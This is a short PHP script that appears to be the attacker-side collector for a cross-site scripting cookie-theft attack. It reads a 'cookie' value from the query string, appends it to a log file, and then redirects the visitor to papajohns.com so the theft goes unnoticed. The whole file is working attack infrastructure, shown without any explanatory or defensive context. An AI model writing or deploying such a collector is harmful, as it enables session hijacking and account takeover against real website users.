<?php
$id = $_GET['cookie'];

$myfile = fopen("log.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\n". $id);
fclose($myfile);
?>
<script type="text/javascript">
window.location="https://www.papajohns.com/";
</script>
